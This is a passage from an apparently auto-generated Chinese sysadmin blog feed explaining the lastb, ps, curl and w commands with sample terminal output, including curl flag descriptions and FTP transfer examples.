<span class="hljs-number">25</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">psxtg</span>    <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-selector-tag">Wed</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">24</span> <span class="hljs-number">19</span>:<span class="hljs-number">23</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">19</span>:<span class="hljs-number">23</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">scdva</span>    <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-selector-tag">Wed</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">24</span> <span class="hljs-number">17</span>:<span class="hljs-number">40</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">17</span>:<span class="hljs-number">40</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br></code></pre></td></tr></table></figure><h4 id="lastb-x-显示系统关机，重新开机，以及执行等级的改变等信息"><a href="#lastb-x-显示系统关机，重新开机，以及执行等级的改变等信息" class="headerlink" title="lastb -x 显示系统关机，重新开机，以及执行等级的改变等信息"></a>lastb -x 显示系统关机，重新开机，以及执行等级的改变等信息</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[root@iZbp1191gh7vw52537lyxrZ log]</span># <span class="hljs-selector-tag">lastb</span> <span class="hljs-selector-tag">-x</span><br>         <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">175.24</span><span class="hljs-selector-class">.152</span><span class="hljs-selector-class">.224</span>   <span class="hljs-selector-tag">Thu</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">25</span> <span class="hljs-number">04</span>:<span class="hljs-number">36</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">04</span>:<span class="hljs-number">36</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">git</span>      <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">60.171</span><span class="hljs-selector-class">.76</span><span class="hljs-selector-class">.133</span>    <span class="hljs-selector-tag">Thu</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">25</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">git</span>      <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">60.171</span><span class="hljs-selector-class">.76</span><span class="hljs-selector-class">.133</span>    <span class="hljs-selector-tag">Thu</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">25</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">psxtg</span>    <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">192.46</span><span class="hljs-selector-class">.210</span><span class="hljs-selector-class">.172</span>   <span class="hljs-selector-tag">Wed</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">24</span> <span class="hljs-number">19</span>:<span class="hljs-number">23</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">19</span>:<span class="hljs-number">23</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">scdva</span>    <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">195.96</span><span class="hljs-selector-class">.137</span><span class="hljs-selector-class">.7</span>     <span class="hljs-selector-tag">Wed</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">24</span> <span class="hljs-number">17</span>:<span class="hljs-number">40</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">17</span>:<span class="hljs-number">40</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br></code></pre></td></tr></table></figure><h4 id="lastb-username-显示指定用户的记录"><a href="#lastb-username-显示指定用户的记录" class="headerlink" title="lastb username 显示指定用户的记录"></a>lastb username 显示指定用户的记录</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[root@iZbp1191gh7vw52537lyxrZ log]</span># <span class="hljs-selector-tag">lastb</span> <span class="hljs-selector-tag">root</span><br><span class="hljs-selector-tag">root</span>     <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">201.213</span><span class="hljs-selector-class">.185</span><span class="hljs-selector-class">.243</span>  <span class="hljs-selector-tag">Tue</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">23</span> <span class="hljs-number">04</span>:<span class="hljs-number">32</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">04</span>:<span class="hljs-number">32</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">root</span>     <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">14.204</span><span class="hljs-selector-class">.145</span><span class="hljs-selector-class">.108</span>   <span class="hljs-selector-tag">Mon</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">15</span> <span class="hljs-number">04</span>:<span class="hljs-number">08</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">04</span>:<span class="hljs-number">08</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">root</span>     <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">14.204</span><span class="hljs-selector-class">.145</span><span class="hljs-selector-class">.108</span>   <span class="hljs-selector-tag">Mon</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">15</span> <span class="hljs-number">04</span>:<span class="hljs-number">06</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">04</span>:<span class="hljs-number">06</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">root</span>     <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">14.204</span><span class="hljs-selector-class">.145</span><span class="hljs-selector-class">.108</span>   <span class="hljs-selector-tag">Mon</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">15</span> <span class="hljs-number">04</span>:<span class="hljs-number">06</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">04</span>:<span class="hljs-number">06</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br></code></pre></td></tr></table></figure><h4 id="lastb-tty-pts-显示指定终端的记录"><a href="#lastb-tty-pts-显示指定终端的记录" class="headerlink" title="lastb tty&#x2F;pts 显示指定终端的记录"></a>lastb tty&#x2F;pts 显示指定终端的记录</h4><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@iZbp1191gh7vw52537lyxrZ log]# lastb pts/1<br><span class="hljs-keyword">test     </span>pts/1                         Thu Aug 18 23:11 - 23:11  (00:00)<br><br>btmp begins Mon Aug  1 18:23:34 2022<br></code></pre></td></tr></table></figure><p>tty可以缩写 lastb 0 &#x3D;&#x3D; lastb tty0</p><h4 id="数据来源"><a href="#数据来源" class="headerlink" title="数据来源"></a>数据来源</h4><p>&#x2F;var&#x2F;log&#x2F;btmp</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata">[root@iZbp1191gh7vw52537lyxrZ <span class="hljs-keyword">log</span>]# <span class="hljs-keyword">ls</span> -lat /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/btmp<br>-rw------- 1 root utmp 52224 8月  25 04:36 /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/btmp<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
      <tag>last</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ps</title>
    <link href="/2024/03/15/yunwei/commands/ps/"/>
    <url>/2024/03/15/yunwei/commands/ps/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>用于查看当前进程信息</p><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ps</span> -ef:基于Unix的选项，可以使用破折号(-)<br><span class="hljs-attribute">UID</span>          PID    PPID  C STIME TTY          TIME CMD<br><span class="hljs-attribute">root</span>           <span class="hljs-number">1</span>       <span class="hljs-number">0</span>  <span class="hljs-number">0</span> Oct27 ?        <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">11</span> /sbin/init<br><br><span class="hljs-attribute">ps</span> aux:基于BSD的选项，不可以使用破折号(-)<br><span class="hljs-attribute">USER</span>         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND<br><span class="hljs-attribute">root</span>           <span class="hljs-number">1</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>  <span class="hljs-number">0</span>.<span class="hljs-number">3</span> <span class="hljs-number">169640</span> <span class="hljs-number">12772</span> ?        Ss   Oct27   <span class="hljs-number">0</span>:<span class="hljs-number">11</span> /sbin/init<br><br></code></pre></td></tr></table></figure><p>备注：<br>ps -aux :打印用户名为x的所有进程，如果x的用户不存在，可能会解释为ps aux</p><p><strong>pa aux 会出现由于命令太长造成被截取的问题</strong></p><p><strong>ps -ef 输出字段解释：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@VM-<span class="hljs-number">8</span>-<span class="hljs-number">5</span>-ubuntu:/proc# ps -ef | grep http | grep -v grep<br><span class="hljs-attribute">root</span>     <span class="hljs-number">3398394</span> <span class="hljs-number">3337140</span>  <span class="hljs-number">0</span> <span class="hljs-number">14</span>:<span class="hljs-number">58</span> pts/<span class="hljs-number">0</span>    <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> python -m http.server<br></code></pre></td></tr></table></figure><table><thead><tr><th>UID</th><th>pid</th><th>PPID</th><th>C</th><th>STIME</th><th>TTY</th><th>TIME</th><th>CMD</th></tr></thead><tbody><tr><td>当前进程启动用户ID</td><td>进程ID</td><td>进程父ID</td><td>进程占用CPU百分比</td><td>进程启动时间</td><td>进程运行的终端，如果进程运行和终端没有关系，则显示？，如果显示pts&#x2F;0，则表示由网络连接主机的终端启动运行</td><td>该进程占用CPU的累计时间（[DD-]hh:mm:ss），</td><td>当前进程执行的命令</td></tr><tr><td>root</td><td>3398394</td><td>3337140</td><td>0</td><td>14:58</td><td>pts&#x2F;0</td><td>00:00:00</td><td>当前进程执行的命令</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
      <tag>ps</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>curl_base</title>
    <link href="/2024/03/15/yunwei/applications/curl/curl_base/"/>
    <url>/2024/03/15/yunwei/applications/curl/curl_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>curl 是一个免费的开源工具，用于从或向服务器传输数据。它支持多种操作系统，如 Windows、Ubuntu、RHEL、CentOS、Fedora 和 OpenSUSE。</p><h2 id="功能提供"><a href="#功能提供" class="headerlink" title="功能提供"></a>功能提供</h2><p>curl 所有的传输功能均为 libcurl 库提供</p><h2 id="语法参数"><a href="#语法参数" class="headerlink" title="语法参数"></a>语法参数</h2><h3 id="–insecure"><a href="#–insecure" class="headerlink" title="–insecure"></a>–insecure</h3><p>忽略HTTPS证书校验</p><h3 id="v"><a href="#v" class="headerlink" title="-v"></a>-v</h3><p>显示完整通信过程，端口连接，request请求</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs gams">root@iZbp1191gh7vw52537lyxrZ:~# curl https:<span class="hljs-comment">//10000hours.github.io -v</span><br><span class="hljs-comment">*   Trying 185.199.108.153:443...</span><br><span class="hljs-comment">*   Trying 2606:50c0:8000::153:443...</span><br><span class="hljs-comment">* Immediate connect fail for 2606:50c0:8000::153: Network is unreachable</span><br><span class="hljs-comment">*   Trying 2606:50c0:8003::153:443...</span><br><span class="hljs-comment">* Immediate connect fail for 2606:50c0:8003::153: Network is unreachable</span><br><span class="hljs-comment">*   Trying 2606:50c0:8002::153:443...</span><br><span class="hljs-comment">* Immediate connect fail for 2606:50c0:8002::153: Network is unreachable</span><br><span class="hljs-comment">*   Trying 2606:50c0:8001::153:443...</span><br><span class="hljs-comment">* Immediate connect fail for 2606:50c0:8001::153: Network is unreachable</span><br><span class="hljs-comment">* Connected to 10000hours.github.io (185.199.108.153) port 443 (#0)</span><br><span class="hljs-comment">* ALPN, offering h2</span><br><span class="hljs-comment">* ALPN, offering http/1.1</span><br><span class="hljs-comment">*  CAfile: /etc/ssl/certs/ca-certificates.crt</span><br><span class="hljs-comment">*  CApath: /etc/ssl/certs</span><br><span class="hljs-comment">* TLSv1.0 (OUT), TLS header, Certificate Status (22):</span><br><span class="hljs-comment">* TLSv1.3 (OUT), TLS handshake, Client hello (1):</span><br><span class="hljs-comment">* TLSv1.2 (IN), TLS header, Certificate Status (22):</span><br></code></pre></td></tr></table></figure><h3 id="H"><a href="#H" class="headerlink" title="-H"></a>-H</h3><p>设置请求header</p><p>-H “X-Stream-Protocol-Version: <a href="http://v2.channel.k8s.io/">v2.channel.k8s.io</a>“</p><h3 id="X"><a href="#X" class="headerlink" title="-X"></a>-X</h3><p>指定协议，默认GET</p><p>-X POST</p><h3 id="d"><a href="#d" class="headerlink" title="-d"></a>-d</h3><p>指定参数 -d ‘key&#x3D;value’，多个参数，多个-d</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">curl -d <span class="hljs-string">&quot;name=curl&quot;</span> https:<span class="hljs-comment">//example.com</span><br>curl -d <span class="hljs-string">&quot;name=curl&quot;</span> -d <span class="hljs-string">&quot;tool=cmdline&quot;</span> https:<span class="hljs-comment">//example.com</span><br></code></pre></td></tr></table></figure><h3 id="G"><a href="#G" class="headerlink" title="-G"></a>-G</h3><p>指定发送GET请求</p><h3 id="k"><a href="#k" class="headerlink" title="-k"></a>-k</h3><p>忽略HTTPS证书校验</p><h3 id="s"><a href="#s" class="headerlink" title="-s"></a>-s</h3><p>静默模式，不输出任何信息</p><h3 id="S"><a href="#S" class="headerlink" title="-S"></a>-S</h3><p>显示错误信息</p><h3 id="L"><a href="#L" class="headerlink" title="-L"></a>-L</h3><p>跟随重定向</p><h3 id="e"><a href="#e" class="headerlink" title="-e"></a>-e</h3><p>设置referer</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">curl -e <span class="hljs-string">&quot;https://example.com&quot;</span> http:<span class="hljs-comment">//www.example.com</span><br></code></pre></td></tr></table></figure><h2 id="支持的协议"><a href="#支持的协议" class="headerlink" title="支持的协议"></a>支持的协议</h2><h3 id="DICT"><a href="#DICT" class="headerlink" title="DICT"></a>DICT</h3><p>Lets you lookup words using online dictionaries.</p><p>允许您使用在线词典查找单词。</p><h3 id="FILE"><a href="#FILE" class="headerlink" title="FILE"></a>FILE</h3><p>Read or write local files. curl does not support accessing file:&#x2F;&#x2F; URL remotely, but when running on Microsoft Windows using the native UNC approach will work.</p><p>读取或写入本地文件。curl不支持远程访问file:&#x2F;&#x2F; URL，但在Microsoft Windows上运行时，使用本机UNC方法可以工作。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># curl file:///root/1.txt</span><br><span class="hljs-number">111111</span><br></code></pre></td></tr></table></figure><h3 id="FTP-FTPS"><a href="#FTP-FTPS" class="headerlink" title="FTP FTPS"></a>FTP FTPS</h3><p>curl supports the File Transfer Protocol with a lot of tweaks and levers. With or without using TLS.</p><p>curl支持使用文件传输协议，并具有许多调整和杠杆作用。无论是否使用TLS，都可以使用它。</p><h4 id="从FTP服务器下载文件"><a href="#从FTP服务器下载文件" class="headerlink" title="从FTP服务器下载文件"></a>从FTP服务器下载文件</h4><p>curl <a href="ftp://username/">ftp://username</a>:<a href="http://mailto:password@ftp.example.com/">password@ftp.example.com</a>&#x2F;download&#x2F;file.txt -o local_file.txt</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elixir">➜  /tmp curl <span class="hljs-symbol">ftp:</span>//<span class="hljs-symbol">hot:</span><span class="hljs-number">123456</span><span class="hljs-variable">@10</span>.<span class="hljs-number">2.2</span>.<span class="hljs-number">2</span>/hotcal.tar.gz -o local_file.txt<br>  % <span class="hljs-title class_">Total</span>    % <span class="hljs-title class_">Received</span> % <span class="hljs-title class_">Xferd</span>  <span class="hljs-title class_">Average</span> <span class="hljs-title class_">Speed</span>   <span class="hljs-title class_">Time</span>    <span class="hljs-title class_">Time</span>     <span class="hljs-title class_">Time</span>  <span class="hljs-title class_">Current</span><br>                                 <span class="hljs-title class_">Dload</span>  <span class="hljs-title class_">Upload</span>   <span class="hljs-title class_">Total</span>   <span class="hljs-title class_">Spent</span>    <span class="hljs-title class_">Left</span>  <span class="hljs-title class_">Speed</span><br><span class="hljs-number">100</span> <span class="hljs-number">95172</span>  <span class="hljs-number">100</span> <span class="hljs-number">95172</span>    <span class="hljs-number">0</span>     <span class="hljs-number">0</span>   <span class="hljs-number">484</span>k      <span class="hljs-number">0</span> --<span class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span> --<span class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span> --<span class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span>  <span class="hljs-number">491</span>k<br><br>➜  /tmp ls -la local_file.txt<br>-rw-r--r--  <span class="hljs-number">1</span> admin  wheel  <span class="hljs-number">95172</span> <span class="hljs-number">10</span> <span class="hljs-number">11</span> <span class="hljs-number">17</span><span class="hljs-symbol">:</span><span class="hljs-number">43</span> local_file.txt<br></code></pre></td></tr></table></figure><h4 id="上传文件到FTP服务器"><a href="#上传文件到FTP服务器" class="headerlink" title="上传文件到FTP服务器"></a>上传文件到FTP服务器</h4><p>curl -T “file.txt” <a href="ftp://username/">ftp://username</a>:<a href="http://mailto:password@ftp.example.com/">password@ftp.example.com</a>&#x2F;upload&#x2F;</p><h4 id="被动模式进行FTP传输"><a href="#被动模式进行FTP传输" class="headerlink" title="被动模式进行FTP传输"></a>被动模式进行FTP传输</h4><p>被动模式用于解决某些情况下，主动模式失败的情况</p><p>curl -e “<a href="ftp://ftp.example.com/">ftp://ftp.example.com</a>“ <a href="ftp://username/">ftp://username</a>:<a href="http://mailto:password@ftp.example.com/">password@ftp.example.com</a>&#x2F;download&#x2F;file.txt -o local_file.txt</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elixir">➜  /tmp curl -e <span class="hljs-string">&quot;ftp://10.2.2.2&quot;</span> <span class="hljs-symbol">ftp:</span>//<span class="hljs-symbol">hot:</span><span class="hljs-number">123456</span><span class="hljs-variable">@10</span>.<span class="hljs-number">2.2</span>.<span class="hljs-number">2</span>/hotcal.tar.gz -o local_file.txt <br>  % <span class="hljs-title class_">Total</span>    % <span class="hljs-title class_">Received</span> % <span class="hljs-title class_">Xferd</span>  <span class="hljs-title class_">Average</span> <span class="hljs-title class_">Speed</span>   <span class="hljs-title class_">Time</span>    <span class="hljs-title class_">Time</span>     <span class="hljs-title class_">Time</span>  <span class="hljs-title class_">Current</span><br>                                 <span class="hljs-title class_">Dload</span>  <span class="hljs-title class_">Upload</span>   <span class="hljs-title class_">Total</span>   <span class="hljs-title class_">Spent</span>    <span class="hljs-title class_">Left</span>  <span class="hljs-title class_">Speed</span><br><span class="hljs-number">100</span> <span class="hljs-number">95172</span>  <span class="hljs-number">100</span> <span class="hljs-number">95172</span>    <span class="hljs-number">0</span>     <span class="hljs-number">0</span>   <span class="hljs-number">518</span>k      <span class="hljs-number">0</span> --<span class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span> --<span class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span> --<span class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span>  <span class="hljs-number">537</span>k<br>➜  /tmp <br>➜  /tmp ls -lat local_file.txt <br>-rw-r--r--  <span class="hljs-number">1</span> admin  wheel  <span class="hljs-number">95172</span> <span class="hljs-number">10</span> <span class="hljs-number">11</span> <span class="hljs-number">19</span><span class="hljs-symbol">:</span><span class="hljs-number">21</span> local_file.txt<br></code></pre></td></tr></table></figure><h3 id="GOPHER-GOPHERS"><a href="#GOPHER-GOPHERS" class="headerlink" title="GOPHER GOPHERS"></a>GOPHER GOPHERS</h3><p>Retrieve files.</p><p>检索文件</p><h3 id="HTTP-HTTPS"><a href="#HTTP-HTTPS" class="headerlink" title="HTTP HTTPS"></a>HTTP HTTPS</h3><p>curl supports HTTP with numerous options and variations. It can speak HTTP version 0.9, 1.0, 1.1, 2 and 3 depending on build options and the correct command line options.</p><p>curl通过许多选项和变体支持HTTP。它可以使用HTTP版本0.9、1.0、1.1、2和3，具体取决于构建选项和正确的命令行选项。</p><h3 id="IMAP-IMAPS"><a href="#IMAP-IMAPS" class="headerlink" title="IMAP IMAPS"></a>IMAP IMAPS</h3><p>Using the mail reading protocol, curl can “download” emails for you. With or without using TLS.</p><p>使用邮件读取协议，curl可以为您“下载”电子邮件。使用或不使用TLS。</p><h3 id="LDAP-LDAPS-MQTT-POP3-POP3S-RTMP-RTMPS-RTSP-SCP-SFTP-SMB-SMBS-SMTP-SMTPS-TELNET-or-TFTP"><a href="#LDAP-LDAPS-MQTT-POP3-POP3S-RTMP-RTMPS-RTSP-SCP-SFTP-SMB-SMBS-SMTP-SMTPS-TELNET-or-TFTP" class="headerlink" title="LDAP, LDAPS, MQTT, POP3, POP3S, RTMP, RTMPS, RTSP, SCP, SFTP, SMB, SMBS, SMTP, SMTPS, TELNET or TFTP"></a>LDAP, LDAPS, MQTT, POP3, POP3S, RTMP, RTMPS, RTSP, SCP, SFTP, SMB, SMBS, SMTP, SMTPS, TELNET or TFTP</h3><h2 id="官方链接"><a href="#官方链接" class="headerlink" title="官方链接"></a>官方链接</h2><p><a href="https://curl.se/libcurl/">https://curl.se/libcurl/</a></p><p><a href="https://github.com/curl/curl">https://github.com/curl/curl</a></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>application</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>application</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>w&amp;who</title>
    <link href="/2024/03/15/yunwei/commands/w&amp;who/"/>
    <url>/2024/03/15/yunwei/commands/w&amp;who/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="w"><a href="#w" class="headerlink" title="w"></a>w</h1><p>显示当前登录系统的用户信息以及当前正在做什么</p><h2 id="参数解释"><a href="#参数解释" class="headerlink" title="参数解释"></a>参数解释</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/var/log# w<br> <span class="hljs-attribute">14</span>:<span class="hljs-number">17</span>:<span class="hljs-number">40</span> up <span class="hljs-number">209</span> days,  <span class="hljs-number">3</span>:<span class="hljs-number">06</span>,  <span class="hljs-number">2</span> users,  load average: <span class="hljs-number">0</span>.<span class="hljs-number">00</span>, <span class="hljs-number">0</span>.<span class="hljs-number">01</span>, <span class="hljs-number">0</span>.<span class="hljs-number">00</span><br><span class="hljs-attribute">USER</span>     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">0</span>    <span class="hljs-number">218.30.113.53</span>    <span class="hljs-number">14</span>:<span class="hljs-number">06</span>    <span class="hljs-number">1</span>:<span class="hljs-number">32</span>   <span class="hljs-number">0</span>.<span class="hljs-number">02</span>s  <span class="hljs-number">0</span>.<span class="hljs-number">00</span>s pager<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">1</span>    <span class="hljs-number">218.30.113.53</span>    <span class="hljs-number">14</span>:<span class="hljs-number">06</span>    <span class="hljs-number">1</span>.<span class="hljs-number">00</span>s  <span class="hljs-number">0</span>.<span class="hljs-number">13</span>s  <span class="hljs-number">0</span>.<span class="hljs-number">00</span>s w<br></code></pre></td></tr></table></figure><p> 14:17:40 up 209 days,  3:06,  2 users,  load average: 0.00, 0.01, 0.00</p><p>当前时间  运行时长  当前用户登录个数  当前系统负载 1分钟 5分钟 15分钟</p><p>USER ：登录用户</p><p>TTY：登录方式，pts 远程登录  tty 本地登录</p><p>FROM：登录来源IP</p><p>LOGIN@：登录时间</p><p>IDLE：闲置时间，也就是终端多久没有操作</p><p>JCPU：对应终端所有进程占用CPU时间，不包含过去已经完成的后台任务，但是包含当前正在运行的后台任务（The JCPU time is the time used by all processes attached to the tty.  It does not include past background jobs, but  does  include currently running background jobs.）</p><p>PCPU：对应终端当前进程占用CPU时间</p><p>WHAT：当前登录用户操作</p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>w [options] user […]</p><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><h4 id="f-不显示登录来源"><a href="#f-不显示登录来源" class="headerlink" title="-f 不显示登录来源"></a>-f 不显示登录来源</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># w -f</span><br> <span class="hljs-number">23</span>:<span class="hljs-number">56</span>:<span class="hljs-number">28</span> up <span class="hljs-number">59</span> days, <span class="hljs-number">14</span>:<span class="hljs-number">23</span>,  <span class="hljs-number">3</span> users,  load average: <span class="hljs-number">0.00</span>, <span class="hljs-number">0.04</span>, <span class="hljs-number">0.05</span><br><span class="hljs-keyword">USER</span>     <span class="hljs-title">TTY</span>        LOGIN@   IDLE   JCPU   PCPU WHAT<br>root     tty1      <span class="hljs-number">266</span>月<span class="hljs-number">22</span>  <span class="hljs-number">1</span>:<span class="hljs-number">04m</span>  <span class="hljs-number">0.10s</span>  <span class="hljs-number">0.10s</span> -bash<br>root     pts/<span class="hljs-number">0</span>     <span class="hljs-number">22</span>:<span class="hljs-number">39</span>    <span class="hljs-number">4.00s</span>  <span class="hljs-number">0.55s</span>  <span class="hljs-number">0.55s</span> -bash<br>root     pts/<span class="hljs-number">1</span>     <span class="hljs-number">23</span>:<span 